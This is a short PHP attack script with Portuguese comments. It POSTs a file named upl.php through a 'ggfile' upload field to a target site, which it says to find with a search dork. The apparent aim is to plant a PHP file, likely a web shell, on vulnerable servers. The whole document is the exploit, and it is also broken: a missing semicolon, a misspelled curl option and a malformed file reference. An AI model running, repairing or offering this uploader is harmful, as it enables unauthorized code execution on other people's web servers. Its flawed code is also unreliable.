<?php
$uploadfile="upl.php";
$ch = curl_init("site que vc encontrar com a dork apenas edita no seu bloco de notas")
curl_setopt ($ch, CURLOPT_POST, true);
curl_setopt ($ch, CURLOPT_POSTFIELDS,
         array('ggfile'=>"@%uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFERFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>